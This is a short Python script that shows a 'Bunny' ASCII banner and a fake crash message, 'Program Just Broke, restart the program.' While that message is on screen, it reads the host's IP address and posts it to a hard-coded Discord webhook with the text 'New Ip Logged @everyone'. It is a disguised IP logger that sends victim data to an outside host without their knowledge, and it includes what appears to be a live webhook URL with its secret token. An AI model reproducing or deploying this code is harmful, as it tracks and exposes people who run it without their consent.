import os
import socket
from colorama import init, Fore
from discord_webhook import DiscordWebhook

init()

ip=socket.gethostbyname(socket.gethostname())
print(Fore.CYAN + """888888b.                                       
888  "88b                                      
888  .88P                                      
8888888K.  888  888 88888b.  88888b.  888  888 
888  "Y88b 888  888 888 "88b 888 "88b 888  888 
888    888 888  888 888  888 888  888 888  888 
888   d88P Y88b 888 888  888 888  888 Y88b 888 
8888888P"   "Y88888 888  888 888  888  "Y88888 
                                           888 
                                      Y8b d88P 
                                       "Y88P"  
                                       
   Program Just Broke, restart the program.""")

webhook = DiscordWebhook(url='https://discord.com/api/webhooks/963693117041684521/3jVZ7dQp5fGORv2lGlOxOGqn2YRiShIC8uqwmywyqD7zA6FnhLxr4fgwP_IqWTSBGfMJ', content="**New Ip Logged @everyone** " + ip)
response = webhook.execute()
